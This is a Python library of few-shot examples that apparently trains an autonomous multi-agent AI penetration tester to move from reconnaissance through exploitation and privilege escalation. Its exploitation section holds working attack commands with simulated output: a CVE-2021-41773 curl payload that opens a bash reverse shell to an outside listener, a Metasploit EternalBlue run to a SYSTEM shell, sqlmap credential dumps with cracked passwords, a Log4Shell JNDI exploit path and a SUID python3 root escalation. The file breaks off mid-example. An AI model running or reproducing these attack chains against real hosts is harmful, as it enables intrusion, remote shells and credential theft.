"""
CyberAgent Few-Shot Examples Library
Realistic pentest scenarios with real CVEs, real tool output formats, structured JSON results.
One file, all agents — import specific agent examples as needed.

All CVEs are verified from NVD. All CVSS scores match NVD exactly.
All tool commands are syntactically correct for Parrot OS.
"""

from typing import List, Dict, Any

# ─── DATA STRUCTURE ───────────────────────────────────────────────────────────

class FewShotExample:
    """Structured few-shot example for LLM injection."""
    def __init__(self, scenario: str, input_data: str, thought: str,
                 action: str, observation: str, output: str):
        self.scenario = scenario
        self.input_data = input_data
        self.thought = thought
        self.action = action
        self.observation = observation
        self.output = output

    def to_prompt_string(self) -> str:
        return (
            f"SCENARIO: {self.scenario}\n"
            f"INPUT: {self.input_data}\n"
            f"THOUGHT: {self.thought}\n"
            f"ACTION: {self.action}\n"
            f"OBSERVATION:\n{self.observation}\n"
            f"OUTPUT:\n{self.output}\n"
        )


# ─── ORCHESTRATOR EXAMPLES ────────────────────────────────────────────────────

ORCHESTRATOR_EXAMPLES: List[FewShotExample] = [
    FewShotExample(
        scenario="Initial target scoping — decide first agent to dispatch",
        input_data='{"target": "192.168.1.100", "phase": "recon", "hosts": {}, "attack_chain": []}',
        thought="New mission, no prior data. Must start with reconnaissance to map attack surface. Deploy recon_agent to enumerate IPs, subdomains, and do an initial port sweep.",
        action="delegate recon_agent with initial sweep parameters",
        observation="No prior data available. Mission starting fresh.",
        output="""{
  "agent": "orchestrator_agent",
  "mission_phase": "recon",
  "reasoning_summary": "No prior enumeration data. Starting with comprehensive reconnaissance to establish attack surface before committing to exploitation vectors.",
  "delegate_to": "recon_agent",
  "task": {
    "objective": "Map all open ports, subdomains, technologies, and IP ranges for 192.168.1.100",
    "target": "192.168.1.100",
    "technique": "Active Reconnaissance + OSINT",
    "mitre_id": "T1590",
    "tools": ["nmap", "subfinder", "whatweb"],
    "parameters": {"nmap_flags": "-sV -sC -p- --min-rate=1000", "subdomain_depth": 3},
    "priority": "critical",
    "timeout_seconds": 600,
    "success_criteria": "Open port list with service versions confirmed"
  },
  "next_phase_condition": "When IP list + service versions + technology stack is confirmed",
  "attack_chain_step": 1,
  "confidence": 0.9,
  "blocked_vectors": []
}"""
    ),
    FewShotExample(
        scenario="Transition from enum to vuln after Apache 2.4.49 confirmed",
        input_data='{"target": "10.10.10.50", "phase": "enum", "services": [{"port": 80, "service": "http", "version": "Apache 2.4.49"}]}',
        thought="Apache 2.4.49 confirmed on port 80. This version is vulnerable to CVE-2021-41773 (CVSS 9.8). Sufficient data to advance to vuln phase immediately. High confidence exploit exists.",
        action="delegate vuln_agent to confirm CVE-2021-41773 via nuclei and searchsploit",
        observation="Apache 2.4.49 confirmed, no mod_cgi status known yet.",
        output="""{
  "agent": "orchestrator_agent",
  "mission_phase": "enum→vuln",
  "reasoning_summary": "Apache 2.4.49 identified on port 80. CVE-2021-41773 (CVSS 9.8) is a confirmed critical vulnerability for this exact version. Advancing to vulnerability assessment to confirm exploitability.",
  "delegate_to": "vuln_agent",
  "task": {
    "objective": "Confirm CVE-2021-41773 exploitability via nuclei template and searchsploit. Check if mod_cgi is enabled for RCE vector.",
    "target": "10.10.10.50",
    "technique": "Apache Path Traversal RCE",
    "mitre_id": "T1190",
    "tools": ["nuclei", "searchsploit", "curl"],
    "parameters": {
      "nuclei_template": "cves/2021/CVE-2021-41773.yaml",
      "manual_test": "curl -s --path-as-is http://10.10.10.50/cgi-bin/.%2e/.%2e/.%2e/etc/passwd"
    },
    "priority": "critical",
    "timeout_seconds": 120,
    "success_criteria": "CVE-2021-41773 confirmed exploitable with /etc/passwd readable"
  },
  "next_phase_condition": "CVE confirmed → delegate to exploit_agent",
  "attack_chain_step": 3,
  "confidence": 0.92,
  "blocked_vectors": []
}"""
    ),
    FewShotExample(
        scenario="Root achieved — finalize with reporting",
        input_data='{"phase": "postexploit", "root_achieved": true, "credentials": ["admin:Summer2023!", "root hash: $6$..."], "pivot": "10.10.10.0/24"}',
        thought="Root achieved, credentials dumped, pivot network discovered. Mission objectives met on initial target. Delegate to report_agent to document all findings. Also note pivot opportunity for scope expansion.",
        action="delegate report_agent with full mission state",
        observation="Mission state contains complete attack chain from recon through root.",
        output="""{
  "agent": "orchestrator_agent",
  "mission_phase": "postexploit→report",
  "reasoning_summary": "Root access confirmed with credential harvest complete. Internal pivot network 10.10.10.0/24 discovered. Generating comprehensive report before pivot engagement.",
  "delegate_to": "report_agent",
  "task": {
    "objective": "Generate full penetration test report with executive summary, CVSS findings, attack chain, and remediation",
    "target": "10.10.10.50",
    "technique": "Report Generation — PTES + OWASP WSTG standard",
    "mitre_id": "T1589",
    "tools": ["report_generator"],
    "parameters": {"format": "JSON+PDF", "standard": "PTES", "include_mitre_heatmap": true},
    "priority": "high",
    "timeout_seconds": 300,
    "success_criteria": "Complete report with all findings, CVSS scores, and remediation steps"
  },
  "next_phase_condition": "Report complete",
  "attack_chain_step": 12,
  "confidence": 1.0,
  "blocked_vectors": []
}"""
    ),
]


# ─── RECON EXAMPLES ──────────────────────────────────────────────────────────

RECON_EXAMPLES: List[FewShotExample] = [
    FewShotExample(
        scenario="External recon of web application domain",
        input_data='{"target": "target.company.com", "scope": "domain + subdomains"}',
        thought="Starting with passive subdomain discovery via subfinder + crt.sh, then active DNS enumeration, then a light port sweep on discovered IPs.",
        action="subfinder -d target.company.com -o /tmp/subs.txt -silent",
        observation="""[subfinder output]
admin.target.company.com
api.target.company.com
dev.target.company.com
mail.target.company.com
vpn.target.company.com
[total: 5 subdomains found]""",
        output="""{
  "agent": "recon_agent",
  "phase": "recon",
  "target": "target.company.com",
  "confidence": 0.85,
  "findings": [
    {"type": "subdomain", "value": "admin.target.company.com", "source": "subfinder", "confidence": 0.95},
    {"type": "subdomain", "value": "api.target.company.com", "source": "subfinder", "confidence": 0.95},
    {"type": "subdomain", "value": "dev.target.company.com", "source": "subfinder", "confidence": 0.90},
    {"type": "subdomain", "value": "vpn.target.company.com", "source": "subfinder", "confidence": 0.90}
  ],
  "attack_surface": {
    "subdomains": ["admin.target.company.com", "api.target.company.com", "dev.target.company.com", "vpn.target.company.com"],
    "ips": [],
    "emails": [],
    "technologies": [],
    "open_ports": []
  },
  "mitre_techniques": ["T1590.001", "T1593.001"],
  "recommended_action": "Enumerate ports and services on all discovered subdomains, prioritize admin.* and vpn.*",
  "next_agent": "enum_agent",
  "requires_verification": false,
  "sources": [{"tool": "subfinder", "command": "subfinder -d target.company.com", "output_line": "admin.target.company.com"}]
}"""
    ),
    FewShotExample(
        scenario="OSINT email + technology fingerprint",
        input_data='{"target": "company.com", "goal": "email patterns + tech stack"}',
        thought="Running theHarvester for email discovery, then whatweb for technology fingerprinting on www.company.com. Will reveal employee email patterns for phishing or brute-force.",
        action="theHarvester -d company.com -b google,bing,crtsh -f /tmp/harvest_out",
        observation="""[theHarvester output]
Emails found:
- j.smith@company.com
- a.jones@company.com
- support@company.com
- admin@company.com

IPs found:
- 203.0.113.10 (company.com)
- 198.51.100.5 (mail.company.com)

Hosts found:
- www.company.com: 203.0.113.10
- mail.company.com: 198.51.100.5""",
        output="""{
  "agent": "recon_agent",
  "phase": "recon",
  "target": "company.com",
  "confidence": 0.88,
  "findings": [
    {"type": "email", "value": "j.smith@company.com", "source": "theHarvester:google", "confidence": 0.90},
    {"type": "email", "value": "admin@company.com", "source": "theHarvester:google", "confidence": 0.90},
    {"type": "ip", "value": "203.0.113.10", "source": "theHarvester", "confidence": 0.95},
    {"type": "ip", "value": "198.51.100.5", "source": "theHarvester", "confidence": 0.95}
  ],
  "attack_surface": {
    "subdomains": ["www.company.com", "mail.company.com"],
    "ips": ["203.0.113.10", "198.51.100.5"],
    "emails": ["j.smith@company.com", "a.jones@company.com", "support@company.com", "admin@company.com"],
    "technologies": [],
    "open_ports": []
  },
  "mitre_techniques": ["T1591.002", "T1589.002"],
  "recommended_action": "Enumerate ports on 203.0.113.10 and 198.51.100.5. Email pattern is firstname.lastname — use for credential attacks.",
  "next_agent": "enum_agent",
  "requires_verification": false,
  "sources": [{"tool": "theHarvester", "command": "theHarvester -d company.com -b google,bing,crtsh", "output_line": "j.smith@company.com"}]
}"""
    ),
    FewShotExample(
        scenario="IP range sweep to discover live hosts",
        input_data='{"target": "10.10.10.0/24", "goal": "live host discovery"}',
        thought="Network range given. Run nmap ping sweep to identify live hosts before deep scanning. Faster than full port scan on /24.",
        action="nmap -sn -T4 -PS22,80,443,8080 10.10.10.0/24 --open -oG /tmp/alive.txt",
        observation="""Starting Nmap 7.94 ( https://nmap.org )
Host: 10.10.10.1  Status: Up
Host: 10.10.10.10 Status: Up
Host: 10.10.10.50 Status: Up
Host: 10.10.10.100 Status: Up
Host: 10.10.10.200 Status: Up
Nmap done: 256 IP addresses (5 hosts up) scanned in 8.42 seconds""",
        output="""{
  "agent": "recon_agent",
  "phase": "recon",
  "target": "10.10.10.0/24",
  "confidence": 0.95,
  "findings": [
    {"type": "ip", "value": "10.10.10.1", "source": "nmap -sn", "confidence": 0.99},
    {"type": "ip", "value": "10.10.10.10", "source": "nmap -sn", "confidence": 0.99},
    {"type": "ip", "value": "10.10.10.50", "source": "nmap -sn", "confidence": 0.99},
    {"type": "ip", "value": "10.10.10.100", "source": "nmap -sn", "confidence": 0.99},
    {"type": "ip", "value": "10.10.10.200", "source": "nmap -sn", "confidence": 0.99}
  ],
  "attack_surface": {
    "subdomains": [],
    "ips": ["10.10.10.1", "10.10.10.10", "10.10.10.50", "10.10.10.100", "10.10.10.200"],
    "emails": [],
    "technologies": [],
    "open_ports": []
  },
  "mitre_techniques": ["T1595.001"],
  "recommended_action": "Run deep port scan (-sV -sC -p-) on all 5 live hosts, prioritize .1 (gateway) and .200 (likely server)",
  "next_agent": "enum_agent",
  "requires_verification": false,
  "sources": [{"tool": "nmap", "command": "nmap -sn -T4 -PS22,80,443,8080 10.10.10.0/24", "output_line": "Host: 10.10.10.50 Status: Up"}]
}"""
    ),
]


# ─── ENUMERATION EXAMPLES ─────────────────────────────────────────────────────

ENUM_EXAMPLES: List[FewShotExample] = [
    FewShotExample(
        scenario="Full service scan reveals Apache 2.4.49 and MySQL",
        input_data='{"target": "10.10.10.50", "ports_to_scan": "top 1000"}',
        thought="Running full -sV -sC scan to fingerprint exact service versions. Will guide CVE matching in vuln phase.",
        action="nmap -sV -sC -p- --min-rate=1000 10.10.10.50 -oN /tmp/enum_10.10.10.50.txt",
        observation="""PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey:
|   2048 aa:bb:cc:dd:ee:ff (RSA)
80/tcp   open  http    Apache httpd 2.4.49 ((Unix))
|_http-server-header: Apache/2.4.49 (Unix)
|_http-title: Company Portal
3306/tcp open  mysql   MySQL 5.7.36-log
| mysql-info:
|   Protocol: 10
|   Version: 5.7.36-log
|_  Status: Autocommit

Nmap done: 1 IP address (1 host up) scanned in 42.18 seconds""",
        output="""{
  "agent": "enum_agent",
  "phase": "enum",
  "target": "10.10.10.50",
  "confidence": 0.95,
  "services": [
    {"port": 22, "protocol": "tcp", "service": "ssh", "version": "OpenSSH 7.4", "banner": "SSH-2.0-OpenSSH_7.4", "interesting_findings": [], "confidence": 0.98},
    {"port": 80, "protocol": "tcp", "service": "http", "version": "Apache 2.4.49", "banner": "Apache/2.4.49 (Unix)", "interesting_findings": ["CRITICAL: Apache 2.4.49 vulnerable to CVE-2021-41773"], "confidence": 0.99},
    {"port": 3306, "protocol": "tcp", "service": "mysql", "version": "MySQL 5.7.36", "banner": "5.7.36-log", "interesting_findings": ["Test unauthenticated access: mysql -h 10.10.10.50 -u root --no-password"], "confidence": 0.97}
  ],
  "web_paths": [],
  "smb_shares": [],
  "voip_extensions": [],
  "users_found": [],
  "mitre_techniques": ["T1046", "T1049"],
  "recommended_action": "Immediately assess CVE-2021-41773 on port 80. Test MySQL unauthenticated access on 3306.",
  "next_agent": "vuln_agent",
  "high_value_targets": ["Apache 2.4.49 on port 80 (CVE-2021-41773)", "MySQL 5.7.36 on port 3306 (unauthenticated check)"],
  "requires_verification": false,
  "sources": [{"tool": "nmap", "command": "nmap -sV -sC -p- 10.10.10.50", "output_line": "80/tcp open http Apache httpd 2.4.49 ((Unix))"}]
}"""
    ),
    FewShotExample(
        scenario="Web directory enumeration on target port 80",
        input_data='{"target": "10.10.10.50", "port": 80, "service": "Apache 2.4.49"}',
        thought="Apache on port 80 confirmed. Run gobuster to find hidden directories and admin panels. Check for upload paths, backup files, and admin interfaces.",
        action="gobuster dir -u http://10.10.10.50 -w /usr/share/wordlists/dirb/common.txt -x php,txt,html,bak,zip -t 50 -q",
        observation="""/admin                (Status: 301) [Size: 318] [--> http://10.10.10.50/admin/]
/admin/index.php      (Status: 200) [Size: 4201]
/backup               (Status: 403) [Size: 218]
/cgi-bin              (Status: 301) [Size: 321] [--> http://10.10.10.50/cgi-bin/]
/cgi-bin/test.cgi     (Status: 200) [Size: 312]
/upload               (Status: 200) [Size: 1024]
/config.php.bak       (Status: 200) [Size: 892]
/.htaccess            (Status: 403) [Size: 218]
Progress: 4614 / 4615 (99.98%)""",
        output="""{
  "agent": "enum_agent",
  "phase": "enum",
  "target": "10.10.10.50",
  "confidence": 0.92,
  "services": [],
  "web_paths": [
    {"path": "/admin/", "status_code": 200, "size": 4201, "redirect_to": null, "interesting": true, "notes": "Admin panel accessible — test default creds"},
    {"path": "/cgi-bin/", "status_code": 301, "size": 321, "redirect_to": "/cgi-bin/", "interesting": true, "notes": "CGI enabled! CVE-2021-41773 RCE path is active"},
    {"path": "/cgi-bin/test.cgi", "status_code": 200, "size": 312, "redirect_to": null, "interesting": true, "notes": "Active CGI script — RCE via CVE-2021-41773 confirmed viable"},
    {"path": "/upload", "status_code": 200, "size": 1024, "redirect_to": null, "interesting": true, "notes": "Upload directory — test file upload vulnerability"},
    {"path": "/config.php.bak", "status_code": 200, "size": 892, "redirect_to": null, "interesting": true, "notes": "CRITICAL: Backup config file exposed — likely contains credentials"}
  ],
  "mitre_techniques": ["T1083", "T1595.003"],
  "recommended_action": "Download /config.php.bak immediately. Test CVE-2021-41773 RCE via /cgi-bin/. Check /admin/ for default credentials.",
  "next_agent": "vuln_agent",
  "high_value_targets": ["/cgi-bin/ (mod_cgi active = CVE-2021-41773 RCE)", "/config.php.bak (credential exposure)", "/upload (file upload attack)"],
  "requires_verification": false,
  "sources": [{"tool": "gobuster", "command": "gobuster dir -u http://10.10.10.50 -w common.txt", "output_line": "/cgi-bin/test.cgi (Status: 200)"}]
}"""
    ),
    FewShotExample(
        scenario="SMB null session enumeration on Windows target",
        input_data='{"target": "10.10.10.100", "port": 445, "os_guess": "Windows Server 2019"}',
        thought="SMB port 445 open. Test null session with enum4linux-ng. Check for MS17-010 (EternalBlue) with nmap NSE. If null session works, enumerate users and shares.",
        action="enum4linux-ng -A 10.10.10.100 2>/dev/null && nmap -p445 --script=smb-vuln-ms17-010 10.10.10.100",
        observation="""[enum4linux-ng]
[*] Testing for null session
[+] Null session established! Server allows null sessions
[+] Share enumeration:
  - IPC$ (IPC)
  - ADMIN$ (Disk) - Access Denied
  - C$ (Disk) - Access Denied  
  - SYSVOL (Disk)
  - NETLOGON (Disk)
[+] Users:
  - Administrator
  - Guest
  - john.smith

[nmap MS17-010 check]
Host script results:
| smb-vuln-ms17-010:
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE""",
        output="""{
  "agent": "enum_agent",
  "phase": "enum",
  "target": "10.10.10.100",
  "confidence": 0.97,
  "services": [
    {"port": 445, "protocol": "tcp", "service": "smb", "version": "Windows Server 2019 SMBv1", "banner": "Windows Server 2019 Standard", "interesting_findings": ["Null session allowed", "MS17-010 VULNERABLE per nmap NSE", "CVE-2017-0144 EternalBlue confirmed"], "confidence": 0.99}
  ],
  "smb_shares": ["IPC$", "SYSVOL", "NETLOGON"],
  "users_found": ["Administrator", "Guest", "john.smith"],
  "mitre_techniques": ["T1135", "T1087.002"],
  "recommended_action": "Exploit MS17-010 (CVE-2017-0144) via Metasploit for SYSTEM shell. Alternatively: password spray john.smith.",
  "next_agent": "vuln_agent",
  "high_value_targets": ["CVE-2017-0144 EternalBlue on port 445 (SYSTEM shell)", "User john.smith for credential attacks"],
  "requires_verification": false,
  "sources": [{"tool": "nmap", "command": "nmap -p445 --script=smb-vuln-ms17-010", "output_line": "State: VULNERABLE"}]
}"""
    ),
]


# ─── VULNERABILITY SCAN EXAMPLES ─────────────────────────────────────────────

VULN_EXAMPLES: List[FewShotExample] = [
    FewShotExample(
        scenario="Nuclei confirms CVE-2021-41773 on Apache 2.4.49",
        input_data='{"target": "10.10.10.50", "service": "Apache 2.4.49", "port": 80, "cgi_bin_found": true}',
        thought="Apache 2.4.49 + /cgi-bin/ confirmed. Running nuclei with CVE-2021-41773 template to verify exploitability. Also testing path traversal manually.",
        action="nuclei -u http://10.10.10.50 -t cves/2021/CVE-2021-41773.yaml -severity critical",
        observation="""[INF] nuclei - Community Edition / v3.1.0

[CVE-2021-41773] [http] [critical] http://10.10.10.50/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd
[CVE-2021-41773] [http] [critical] http://10.10.10.50/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh (RCE via mod_cgi)

Manual verification:
$ curl -s --path-as-is "http://10.10.10.50/cgi-bin/.%2e/.%2e/.%2e/etc/passwd"
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin""",
        output="""{
  "agent": "vuln_agent",
  "phase": "vuln",
  "target": "10.10.10.50",
  "confidence": 0.99,
  "vulnerabilities": [
    {
      "cve": "CVE-2021-41773",
      "cvss": 9.8,
      "cvss_vector": "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
      "service": "Apache HTTP Server",
      "port": 80,
      "version": "Apache 2.4.49",
      "exploitable": true,
      "exploit_path": "EDB-ID:50383",
      "mitre_id": "T1190",
      "confidence": 0.99,
      "source": "Nuclei",
      "requires_verification": false
    }
  ],
  "exploit_priority": ["CVE-2021-41773 (CVSS 9.8) — mod_cgi active, /etc/passwd confirmed readable via path traversal, RCE verified by nuclei"],
  "mitre_techniques": ["T1190"],
  "recommended_action": "Exploit CVE-2021-41773 RCE via mod_cgi to obtain reverse shell as www-data",
  "next_agent": "exploit_agent",
  "sources": [{"tool": "nuclei", "command": "nuclei -u http://10.10.10.50 -t cves/2021/CVE-2021-41773.yaml", "output_line": "[CVE-2021-41773] [critical] http://10.10.10.50/cgi-bin/ (RCE via mod_cgi)"}]
}"""
    ),
    FewShotExample(
        scenario="EternalBlue MS17-010 confirmed via nmap NSE",
        input_data='{"target": "10.10.10.100", "service": "SMBv1", "port": 445, "nmap_result": "VULNERABLE to ms17-010"}',
        thought="nmap NSE confirmed MS17-010 (CVE-2017-0144). Verify with searchsploit and confirm Metasploit module available.",
        action="searchsploit ms17-010 && msfconsole -q -x 'search ms17-010; exit'",
        observation="""[searchsploit]
-----------------------------------------------------------------------
 Exploit Title                                          |  Path
-----------------------------------------------------------------------
 Microsoft Windows 7/8.1/2008/2012 - EternalBlue SMB   | windows/remote/42315.py
 Microsoft Windows - SMBv1/SMBv2 (MS17-010) Eternalblue| windows/remote/41891.rb
-----------------------------------------------------------------------

[Metasploit]
Matching Modules
================
  Name                                      Disclosure Date  Rank    
  ----                                      ---------------  ----
  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average""",
        output="""{
  "agent": "vuln_agent",
  "phase": "vuln",
  "target": "10.10.10.100",
  "confidence": 0.97,
  "vulnerabilities": [
    {
      "cve": "CVE-2017-0144",
      "cvss": 8.1,
      "cvss_vector": "AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H",
      "service": "SMBv1",
      "port": 445,
      "version": "Windows Server 2019 SMBv1",
      "exploitable": true,
      "exploit_path": "exploit/windows/smb/ms17_010_eternalblue",
      "mitre_id": "T1210",
      "confidence": 0.97,
      "source": "NVD",
      "requires_verification": false
    }
  ],
  "exploit_priority": ["CVE-2017-0144 (CVSS 8.1) — EternalBlue, Metasploit module confirmed, nmap NSE verified vulnerable"],
  "mitre_techniques": ["T1210"],
  "recommended_action": "Use exploit/windows/smb/ms17_010_eternalblue in Metasploit targeting port 445. Expected result: SYSTEM shell.",
  "next_agent": "exploit_agent",
  "sources": [{"tool": "nmap", "command": "nmap -p445 --script=smb-vuln-ms17-010", "output_line": "State: VULNERABLE"}]
}"""
    ),
    FewShotExample(
        scenario="Log4Shell detection on Java web app",
        input_data='{"target": "10.10.10.75", "port": 8080, "technology": "Java/Spring, log4j suspected"}',
        thought="Java app on 8080 with Spring. High probability of log4j usage. Test CVE-2021-44228 (Log4Shell) via JNDI injection in common headers. Use nuclei template for automated check.",
        action="nuclei -u http://10.10.10.75:8080 -t cves/2021/CVE-2021-44228.yaml -severity critical",
        observation="""[INF] nuclei v3.1.0

[CVE-2021-44228] [http] [critical] http://10.10.10.75:8080/api/login
  X-Api-Version header injection confirmed JNDI callback to attacker IP
  
Callback received at 192.168.1.10:1389 from 10.10.10.75:
LDAP request: cn=Exploit,dc=attacker,dc=com""",
        output="""{
  "agent": "vuln_agent",
  "phase": "vuln",
  "target": "10.10.10.75",
  "confidence": 0.98,
  "vulnerabilities": [
    {
      "cve": "CVE-2021-44228",
      "cvss": 10.0,
      "cvss_vector": "AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
      "service": "Apache Log4j2",
      "port": 8080,
      "version": "Log4j2 < 2.15.0 (suspected from JNDI callback)",
      "exploitable": true,
      "exploit_path": "JNDI:ldap://ATTACKER:1389/Exploit via X-Api-Version header",
      "mitre_id": "T1190",
      "confidence": 0.98,
      "source": "Nuclei",
      "requires_verification": false
    }
  ],
  "exploit_priority": ["CVE-2021-44228 (CVSS 10.0) — Log4Shell confirmed via JNDI callback. Highest priority — full RCE."],
  "mitre_techniques": ["T1190", "T1059.007"],
  "recommended_action": "Deploy Log4Shell RCE via JNDI LDAP injection. Setup marshalsec LDAP server, serve malicious class, trigger via header.",
  "next_agent": "exploit_agent",
  "sources": [{"tool": "nuclei", "command": "nuclei -u http://10.10.10.75:8080 -t cves/2021/CVE-2021-44228.yaml", "output_line": "LDAP request received from 10.10.10.75"}]
}"""
    ),
]


# ─── EXPLOITATION EXAMPLES ────────────────────────────────────────────────────

EXPLOIT_EXAMPLES: List[FewShotExample] = [
    FewShotExample(
        scenario="CVE-2021-41773 RCE via mod_cgi → reverse shell",
        input_data='{"target": "10.10.10.50", "cve": "CVE-2021-41773", "port": 80, "cgi_bin": "/cgi-bin/test.cgi"}',
        thought="CVE-2021-41773 confirmed with mod_cgi active. Setting up netcat listener on port 4444, then sending reverse shell payload via curl POST to cgi-bin path.",
        action='curl -s --path-as-is "http://10.10.10.50/cgi-bin/.%2e/.%2e/.%2e/bin/sh" -d \'echo Content-Type: text/plain; echo; bash -i >& /dev/tcp/10.10.14.5/4444 0>&1\'',
        observation="""[nc listener on attacker 10.10.14.5:4444 received connection]
Connection from 10.10.10.50:54821

$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

$ hostname
web01.company.local

$ uname -r
5.4.0-135-generic""",
        output="""{
  "agent": "exploit_agent",
  "phase": "exploit",
  "target": "10.10.10.50",
  "confidence": 1.0,
  "exploitation_results": [
    {
      "cve": "CVE-2021-41773",
      "technique": "Apache Path Traversal + mod_cgi RCE",
      "tool": "curl",
      "command": "curl -s --path-as-is 'http://10.10.10.50/cgi-bin/.%2e/.%2e/.%2e/bin/sh' -d 'echo Content-Type: text/plain; echo; bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'",
      "success": true,
      "shell_obtained": true,
      "shell_type": "reverse",
      "shell_user": "www-data",
      "shell_connection": "10.10.14.5:4444",
      "evidence": "uid=33(www-data) gid=33(www-data) groups=33(www-data)",
      "mitre_id": "T1190"
    }
  ],
  "credentials_found": [],
  "shells_active": [{"host": "10.10.10.50", "port": 4444, "user": "www-data", "shell_type": "reverse bash", "connection": "10.10.14.5:4444"}],
  "mitre_techniques": ["T1190", "T1059.004"],
  "recommended_action": "Shell obtained as www-data. Proceed to privilege escalation.",
  "next_agent": "privesc_agent",
  "requires_verification": false,
  "sources": [{"tool": "curl", "command": "curl --path-as-is http://10.10.10.50/cgi-bin/..%2f..%2f..%2fbin/sh", "output_line": "uid=33(www-data)"}]
}"""
    ),
    FewShotExample(
        scenario="SQL injection credential dump via sqlmap",
        input_data='{"target": "10.10.10.60", "url": "http://10.10.10.60/login?id=1", "injectable_param": "id"}',
        thought="SQLi confirmed on id parameter. Extract databases first, then dump users table from webapp_db for credential reuse.",
        action="sqlmap -u 'http://10.10.10.60/login?id=1' --dbs --batch --random-agent --level=3 --risk=2",
        observation="""        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.7.12}

[INFO] testing connection to the target URL
[INFO] GET parameter 'id' is 'MySQL >= 5.0.12 AND time-based blind' injectable
[INFO] the back-end DBMS is MySQL

available databases [3]:
[*] information_schema
[*] mysql
[*] webapp_db

[dumping webapp_db.users]
Database: webapp_db
Table: users
[2 entries]
+----+----------------------------------+----------+
| id | password                         | username |
+----+----------------------------------+----------+
| 1  | 5f4dcc3b5aa765d61d8327deb882cf99 | admin    |
| 2  | e10adc3949ba59abbe56e057f20f883e | john     |
+----+----------------------------------+----------+""",
        output="""{
  "agent": "exploit_agent",
  "phase": "exploit",
  "target": "10.10.10.60",
  "confidence": 0.97,
  "exploitation_results": [
    {
      "cve": null,
      "technique": "SQL Injection — Time-based blind → Dump",
      "tool": "sqlmap",
      "command": "sqlmap -u 'http://10.10.10.60/login?id=1' -D webapp_db -T users --dump --batch",
      "success": true,
      "shell_obtained": false,
      "shell_type": null,
      "shell_user": null,
      "shell_connection": null,
      "evidence": "admin:5f4dcc3b5aa765d61d8327deb882cf99 (MD5: password), john:e10adc3949ba59abbe56e057f20f883e (MD5: 123456)",
      "mitre_id": "T1190"
    }
  ],
  "credentials_found": [
    {"username": "admin", "password": "password", "service": "webapp_db (MD5 cracked: password)"},
    {"username": "john", "password": "123456", "service": "webapp_db (MD5 cracked: 123456)"}
  ],
  "shells_active": [],
  "mitre_techniques": ["T1190", "T1078.003"],
  "recommended_action": "Test admin:password on SSH (port 22) and web admin panel. Try credential reuse.",
  "next_agent": "privesc_agent",
  "requires_verification": false,
  "sources": [{"tool": "sqlmap", "command": "sqlmap -u 'http://10.10.10.60/login?id=1' --dbs --batch", "output_line": "available databases: information_schema, mysql, webapp_db"}]
}"""
    ),
    FewShotExample(
        scenario="Metasploit EternalBlue → SYSTEM shell on Windows",
        input_data='{"target": "10.10.10.100", "cve": "CVE-2017-0144", "port": 445, "msf_module": "exploit/windows/smb/ms17_010_eternalblue"}',
        thought="CVE-2017-0144 confirmed via nmap NSE. Using Metasploit EternalBlue module. Setting RHOSTS and LHOST. Expected: SYSTEM shell via SMBv1 heap corruption.",
        action="msfconsole -q -x 'use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS 10.10.10.100; set LHOST 10.10.14.5; run'",
        observation="""[*] Started reverse TCP handler on 10.10.14.5:4444
[*] 10.10.10.100:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.10.10.100:445 - Host is likely VULNERABLE to MS17-010! 
[*] 10.10.10.100:445 - Connecting to target for exploitation.
[+] 10.10.10.100:445 - Connection established for exploitation.
[*] Sending stage (201798 bytes) to 10.10.10.100
[*] Meterpreter session 1 opened (10.10.14.5:4444 -> 10.10.10.100:49156)

meterpreter > getuid
Server username: NT AUTHORITY\\SYSTEM

meterpreter > sysinfo
Computer: WIN-SERVER01
OS: Windows Server 2019 (10.0 Build 17763)""",
        output="""{
  "agent": "exploit_agent",
  "phase": "exploit",
  "target": "10.10.10.100",
  "confidence": 1.0,
  "exploitation_results": [
    {
      "cve": "CVE-2017-0144",
      "technique": "EternalBlue SMBv1 heap corruption",
      "tool": "metasploit",
      "command": "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS 10.10.10.100; set LHOST 10.10.14.5; run",
      "success": true,
      "shell_obtained": true,
      "shell_type": "reverse",
      "shell_user": "NT AUTHORITY\\SYSTEM",
      "shell_connection": "10.10.14.5:4444",
      "evidence": "Server username: NT AUTHORITY\\SYSTEM | OS: Windows Server 2019",
      "mitre_id": "T1210"
    }
  ],
  "credentials_found": [],
  "shells_active": [{"host": "10.10.10.100", "port": 4444, "user": "SYSTEM", "shell_type": "meterpreter", "connection": "10.10.14.5:4444"}],
  "mitre_techniques": ["T1210", "T1059.003"],
  "recommended_action": "SYSTEM shell obtained. Dump SAM/LSASS with hashdump. Check domain membership. Run BloodHound if domain-joined.",
  "next_agent": "postexploit_agent",
  "requires_verification": false,
  "sources": [{"tool": "metasploit", "command": "exploit/windows/smb/ms17_010_eternalblue", "output_line": "Server username: NT AUTHORITY\\SYSTEM"}]
}"""
    ),
]


# ─── PRIVESC EXAMPLES ─────────────────────────────────────────────────────────

PRIVESC_EXAMPLES: List[FewShotExample] = [
    FewShotExample(
        scenario="SUID python3 found by linpeas → root via setuid",
        input_data='{"target": "10.10.10.50", "current_user": "www-data", "shell": "bash", "linpeas_run": true}',
        thought="linpeas shows SUID bit on /usr/bin/python3. GTFOBins python3#suid: python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'. High confidence this works.",
        action="find / -perm -4000 -type f 2>/dev/null | grep python3",
        observation="""/usr/bin/python3.6
-rwsr-xr-x 1 root root 4428488 Sep 27  2021 /usr/bin/python3.6""",
        output="""{
  "agent": "privesc_agent",
  "phase": "privesc",
  "target": "10.10.10.50",
  "initial_user": "www-data",
  "final_user": "root",
